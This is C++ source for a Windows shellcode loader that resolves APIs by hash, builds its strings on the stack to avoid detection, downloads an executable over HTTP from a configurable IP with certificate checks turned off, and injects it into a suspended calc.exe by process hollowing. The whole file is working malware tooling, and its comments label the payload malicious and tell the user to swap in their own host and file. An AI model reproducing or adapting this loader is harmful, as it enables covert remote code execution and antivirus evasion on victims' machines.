// CreateProcess.cpp : Defines the entry point for the console application.
// Inspired from here: http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html
#define WIN32_LEAN_AND_MEAN
#define CREATE_NO_WINDOW 0x08000000
#define CREATE_SUSPENDED 0x00000004

#pragma warning( disable : 4055 )
#pragma warning (disable: 4201)

#include <windows.h>
#include <stdio.h>
#include <GetProcAddressByHash.h>
#include <intrin.h>
#include <WinInet.h>

#pragma comment(lib, "Wininet")

// Define all the API's and STRUCTURES that we will need.
typedef struct PROCINFO {
	DWORD	baseAddr;
	DWORD	imageSize;
} PROCINFO;

typedef HMODULE(WINAPI *FuncLoadLibraryA) (
	_In_z_ LPTSTR lpFileName
	);

typedef BOOL(WINAPI *FuncCreateProcess) (
	_In_opt_ LPCTSTR lpApplicationName,
	_Inout_opt_ LPTSTR lpCommandLine,
	_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
	_In_  BOOL bInheritHandles,
	_In_  DWORD dwCreationFlags,
	_In_opt_ LPVOID lpEnvironment,
	_In_opt_ LPCTSTR lpCurrentDirectory,
	_In_  LPSTARTUPINFO lpStartupInfo,
	_Out_  LPPROCESS_INFORMATION lpProcessInformation
	);

typedef DWORD(WINAPI *FuncWaitForSingleObject) (
	_In_  HANDLE hHandle,
	_In_  DWORD dwMilliseconds
	);

typedef BOOL(WINAPI *FuncGetThreadContext) (
	_In_     HANDLE hThread,
	_Inout_  LPCONTEXT lpContext
	);

typedef BOOL(WINAPI *FuncReadProcessMemory) (
	_In_   HANDLE hProcess,
	_In_   LPCVOID lpBaseAddress,
	_Out_  LPVOID lpBuffer,
	_In_   SIZE_T nSize,
	_Out_  SIZE_T *lpNumberOfBytesRead
	);

typedef SIZE_T(WINAPI *FuncVirtualQueryEx) (
	_In_      HANDLE hProcess,
	_In_opt_  LPCVOID lpAddress,
	_Out_     PMEMORY_BASIC_INFORMATION lpBuffer,
	_In_      SIZE_T dwLength
	);

typedef HINTERNET (WINAPI *FuncInternetOpenA) (
	_In_  LPCTSTR lpszAgent,
	_In_  DWORD dwAccessType,
	_In_  LPCTSTR lpszProxyName,
	_In_  LPCTSTR lpszProxyBypass,
	_In_  DWORD dwFlags
	);

typedef HINTERNET (WINAPI *FuncInternetConnectA) (
	_In_  HINTERNET hInternet,
	_In_  LPCTSTR lpszServerName,
	_In_  INTERNET_PORT nServerPort,
	_In_  LPCTSTR lpszUsername,
	_In_  LPCTSTR lpszPassword,
	_In_  DWORD dwService,
	_In_  DWORD dwFlags,
	_In_  DWORD_PTR dwContext
	);

typedef HINTERNET (WINAPI *FuncHttpOpenRequestA) (
	_In_  HINTERNET hConnect,
	_In_  LPCTSTR lpszVerb,
	_In_  LPCTSTR lpszObjectName,
	_In_  LPCTSTR lpszVersion,
	_In_  LPCTSTR lpszReferer,
	_In_  LPCTSTR *lplpszAcceptTypes,
	_In_  DWORD dwFlags,
	_In_  DWORD_PTR dwContext
	);

typedef BOOL (WINAPI *FuncInternetSetOptionA)(
	_In_  HINTERNET hInternet,
	_In_  DWORD dwOption,
	_In_  LPVOID lpBuffer,
	_In_  DWORD dwBufferLength
	);

typedef BOOL (WINAPI *FuncHttpSendRequestA) (
	_In_  HINTERNET hRequest,
	_In_  LPCTSTR lpszHeaders,
	_In_  DWORD dwHeadersLength,
	_In_  LPVOID lpOptional,
	_In_  DWORD dwOptionalLength
	);

typedef BOOL (WINAPI *FuncInternetReadFile) (
	_In_   HINTERNET hFile,
	_Out_  LPVOID lpBuffer,
	_In_   DWORD dwNumberOfBytesToRead,
	_Out_  LPDWORD lpdwNumberOfBytesRead
	);

typedef LPVOID(WINAPI *FuncVirtualAlloc) (
	_In_opt_  LPVOID lpAddress,
	_In_      SIZE_T dwSize,
	_In_      DWORD flAllocationType,
	_In_      DWORD flProtect
	);

typedef BOOL(WINAPI *FuncWriteProcessMemory) (
	_In_   HANDLE hProcess,
	_In_   LPVOID lpBaseAddress,
	_In_   LPCVOID lpBuffer,
	_In_   SIZE_T nSize,
	_Out_  SIZE_T *lpNumberOfBytesWritten
	);

typedef BOOL(WINAPI *FuncVirtualProtectEx) (
	_In_   HANDLE hProcess,
	_In_   LPVOID lpAddress,
	_In_   SIZE_T dwSize,
	_In_   DWORD flNewProtect,
	_Out_  PDWORD lpflOldProtect
	);

typedef LPVOID(WINAPI *FuncVirtualAllocEx) (
	_In_      HANDLE hProcess,
	_In_opt_  LPVOID lpAddress,
	_In_      SIZE_T dwSize,
	_In_      DWORD flAllocationType,
	_In_      DWORD flProtect
	);

typedef BOOL(WINAPI *FuncSetThreadContext) (
	_In_  HANDLE hThread,
	_In_  const CONTEXT *lpContext
	);

typedef DWORD(WINAPI *FuncResumeThread) (
	_In_  HANDLE hThread
	);

typedef BOOL(WINAPI *FuncVirtualFree) (
	_In_  LPVOID lpAddress,
	_In_  SIZE_T dwSize,
	_In_  DWORD dwFreeType
	);

typedef LPTSTR (WINAPI *Funclstrcat) (
	_Inout_  LPTSTR lpString1,
	_In_     LPTSTR lpString2
	);
// END API & STRUCT definitions.

VOID ExecPayload(VOID)
{

	// Prepare initial variables that we will require.
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	SecureZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	SecureZeroMemory(&pi, sizeof(pi));

	// Strings must be treated as a char array in order to prevent them from being stored in
	// an .rdata section. In order to maintain position independence, all data must be stored
	// in the same section. Thanks to Nick Harbour for coming up with this technique:
	// http://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/
	// IF THE STRING IS BIGGER THAN 15 CHARS INCLUDING THE TERMINATOR IT WILL CREATE A RDATA SECTION, USE "clstrcat" FROM kernel32 to AVOID IT.

	// wininet[] = "wininet.dll"
	// process[] = C:\\Windows\\System32\\calc.exe
	char wininet[] = { 'w', 'i', 'n', 'i', 'n', 'e', 't', '.', 'd', 'l', 'l', 0 };
	char process[] = { 'C', ':', '\\', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', '\\', 'S', 0 };
	char process2[] = { 'y', 's', 't', 'e', 'm', '3', '2', '\\', '\\', 'c', 'a', 'l', 'c', '.', 0 };
	char process3[] = { 'e', 'x', 'e', 0 };

	// Declare the API's.
	Funclstrcat Myclstrcat;
	FuncLoadLibraryA MyLoadLibraryA;
	FuncCreateProcess MyCreateProcessA;
	FuncWaitForSingleObject MyWaitForSingleObject;
	FuncGetThreadContext MyGetThreadContext;
	FuncReadProcessMemory MyReadProcessMemory;
	FuncVirtualQueryEx MyVirtualQueryEx;
	FuncInternetOpenA MyInternetOpenA;
	FuncInternetConnectA MyInternetConnectA;
	FuncHttpOpenRequestA MyHttpOpenRequestA;
	FuncInternetSetOptionA MyInternetSetOptionA;
	FuncHttpSendRequestA MyHttpSendRequestA;
	FuncInternetReadFile MyInternetReadFile;
	FuncVirtualAlloc MyVirtualAlloc;
	FuncWriteProcessMemory MyWriteProcessMemory;
	FuncVirtualProtectEx MyVirtualProtectEx;
	FuncVirtualAllocEx MyVirtualAllocEx;
	FuncSetThreadContext MySetThreadContext;
	FuncResumeThread MyResumeThread;
	FuncVirtualFree MyVirtualFree;

	// Load "WinInet.dll" before we start resolving stuff.
	MyLoadLibraryA = (FuncLoadLibraryA)GetProcAddressByHash(0x0726774C);
	MyLoadLibraryA((LPTSTR)wininet);

	// Resolve all our API's.
	MyCreateProcessA = (FuncCreateProcess)GetProcAddressByHash(0x863FCC79);
	MyWaitForSingleObject = (FuncWaitForSingleObject)GetProcAddressByHash(0x601D8708);
	MyGetThreadContext = (FuncGetThreadContext)GetProcAddressByHash(0xD1425C18);
	MyReadProcessMemory = (FuncReadProcessMemory)GetProcAddressByHash(0x71F9D3C2);
	MyVirtualQueryEx = (FuncVirtualQueryEx)GetProcAddressByHash(0xEBB6B9AB);
	MyInternetOpenA = (FuncInternetOpenA)GetProcAddressByHash(0xA779563A);
	MyInternetConnectA = (FuncInternetConnectA)GetProcAddressByHash(0xC69F8957);
	MyHttpOpenRequestA = (FuncHttpOpenRequestA)GetProcAddressByHash(0x3B2E55EB);
	MyInternetSetOptionA = (FuncInternetSetOptionA)GetProcAddressByHash(0x869E4675);
	MyHttpSendRequestA = (FuncHttpSendRequestA)GetProcAddressByHash(0x7B18062D);
	MyInternetReadFile = (FuncInternetReadFile)GetProcAddressByHash(0xE2899612);
	MyVirtualAlloc = (FuncVirtualAlloc)GetProcAddressByHash(0xE553A458);
	MyWriteProcessMemory = (FuncWriteProcessMemory)GetProcAddressByHash(0xE7BDD8C5);
	MyVirtualProtectEx = (FuncVirtualProtectEx)GetProcAddressByHash(0xCD61B5A6);
	MyVirtualAllocEx = (FuncVirtualAllocEx)GetProcAddressByHash(0x3F9287AE);
	MySetThreadContext = (FuncSetThreadContext)GetProcAddressByHash(0xD14E5C18);
	MyResumeThread = (FuncResumeThread)GetProcAddressByHash(0x8EF4092B);
	MyVirtualFree = (FuncVirtualFree)GetProcAddressByHash(0x300F2F0B);
	Myclstrcat = (Funclstrcat)GetProcAddressByHash(0x5E225CD4);

	// ######## PART I ########
	// ######## Setup the process in which we will inject our malicious file ########

	// Create a process in SUSPENDED state.
	Myclstrcat((LPTSTR)process, (LPTSTR)process2);
	Myclstrcat((LPTSTR)process, (LPTSTR)process3);
	MyCreateProcessA(NULL, (LPTSTR)process, NULL, NULL, 1, CREATE_NO_WINDOW | CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	// Get the context of that process.
	LPCONTEXT CTX;
	CTX = (LPCONTEXT)MyVirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE);
	CTX->ContextFlags = CONTEXT_FULL;
	MyGetThreadContext(pi.hThread, CTX);

	// EBX points to PEB; PEB+0x8 you have a ptr to base address. (TO DEBUG MAKE SURE YOU ATTACH TO THE SUSPENDED PROCESS)
	DWORD pebInfo = CTX->Ebx + 0x8;
	DWORD dwImageBase;
	DWORD read;

	// Read the Image Base of the process.
	MyReadProcessMemory(pi.hProcess, (LPCVOID)pebInfo, (LPVOID)&dwImageBase, sizeof(DWORD), &read);

	PROCINFO HostProc;
	HostProc.baseAddr = dwImageBase;
	DWORD curAddr = HostProc.baseAddr;
	MEMORY_BASIC_INFORMATION memInfo;

	// Loop to the region pages until you reach free memory then break the loop.
	while (MyVirtualQueryEx(pi.hProcess, (LPCVOID)curAddr, &memInfo, sizeof(memInfo))) {
		if (memInfo.State == MEM_FREE) {
			break;
		}
		curAddr += memInfo.RegionSize;
	}

	// At this point we should be able to substract the base address and get the image size.
	HostProc.imageSize = curAddr - HostProc.baseAddr;

	// ######## END PART I ########
	// ######## You should have the ImageSize as well as the BaseAddress of the Host Process ########

	// ######## PART II ########
	// ######## Grab the malicious PE from the internet, load it in memory & initiate the process hollow ########

	// Setup all the needed variables & flags so we don't deal with them later.
	PIMAGE_DOS_HEADER IDH;
	PIMAGE_NT_HEADERS INH;
	PIMAGE_SECTION_HEADER ISH;
	DWORD oldProtect;
	DWORD wrote_zero;
	LPVOID zero_buff;
	LPVOID pe_allocation;
	DWORD bytesRead;
	DWORD dwLength = 0x1400000; // Length of the EXE = 20 MB (CHANGE IF REQUIRED)
	DWORD dwFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;
	HINTERNET internet_open;
	HINTERNET internet_connect;
	HINTERNET http_request;

	// hostname[] = "192.168.43.130" (CHANGE THIS TO THE IP HOSTING THE PE YOU WANT TO INJECT)
	// payload[] = "sc.exe" (CHANGE THIS TO THE NAME OF THE PE YOU WANT TO INJECT)
	// http[] = "HTTP/1.1" (CHANGE THIS IF REALLY REQUIRED, MAKE SURE YOU USE A CORRECT ONE)
	char hostname[] = { '1', '9', '2', '.', '1', '6', '8', '.', '4', '3', '.', '1', '3', '0', 0 };
	char payload[] = { 's', 'c', '.', 'e', 'x', 'e', 0 };
	char http[] = { 'H', 'T', 'T', 'P', '/', '1', '.', '1', 0 };

	// Prepare everything for reading the PE in memory.
	internet_open = MyInternetOpenA(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	internet_connect = MyInternetConnectA(internet_open, hostname, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, INTERNET_FLAG_RELOAD, 0);
	http_request = MyHttpOpenRequestA(internet_connect, NULL, payload, http, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_EXISTING_CONNECT, 0);
	MyInternetSetOptionA(http_request, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
	MyHttpSendRequestA(http_request, 0, 0, 0, 0);
	
	// Allocate some memory for the PE & read it from the interwebz <3.
	pe_allocation = MyVirtualAlloc(NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	MyInternetReadFile(http_request, pe_allocation, dwLength, &bytesRead);

	zero_buff = MyVirtualAlloc(NULL, HostProc.imageSize, MEM_COMMIT, PAGE_READWRITE);

	// Check to see if the PE we loaded is right.
	IDH = (PIMAGE_DOS_HEADER)pe_allocation;
	if (IDH->e_magic == IMAGE_DOS_SIGNATURE) {

		INH = (PIMAGE_NT_HEADERS)((DWORD)pe_allocation + IDH->e_lfanew);
		if (INH->Signature == IMAGE_NT_SIGNATURE) {

			// If you reach here PE is right & we 0 out the entire target process.
			MyVirtualProtectEx(pi.hProcess, (LPVOID)HostProc.baseAddr, HostProc.imageSize, PAGE_EXECUTE_READWRITE, &oldProtect);
			MyWriteProcessMemory(pi.hProcess, (LPVOID)HostProc.baseAddr, zero_buff, HostProc.imageSize, &wrote_zero);

			// We start allocating as much memory in the target process as our PE requires.
			LPVOID pImageBase;
			int Count;
			pImageBase = MyVirtualAllocEx(pi.hProcess, (LPVOID)INH->OptionalHeader.ImageBase, INH->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

			// Patch the PEB.
			MyWriteProcessMemory(pi.hProcess, pImageBase, pe_allocation, INH->OptionalHeader.SizeOfHeaders, NULL);

			// Let's do this ... 
			for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++) {
				ISH = (PIMAGE_SECTION_HEADER)((DWORD)pe_allocation + IDH->e_lfanew + 248 + (Count * 40));
				MyWriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)pImageBase + ISH->VirtualAddress), (LPVOID)((DWORD)pe_allocation + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
			}

			// Patch the ImageBase & Entry Point in the new PE & resume execution.
			MyWriteProcessMemory(pi.hProcess, (LPVOID)pebInfo, (LPVOID)(&INH->OptionalHeader.ImageBase), sizeof(DWORD), NULL);
			CTX->Eax = (DWORD)pImageBase + INH->OptionalHeader.AddressOfEntryPoint;
			MySetThreadContext(pi.hThread, CTX);
			MyResumeThread(pi.hThread);
		}

		// Free stuff up.
		MyVirtualFree(pe_allocation, 0, MEM_RELEASE);
	}

	// We're done.
	MyWaitForSingleObject(pi.hProcess, INFINITE);
}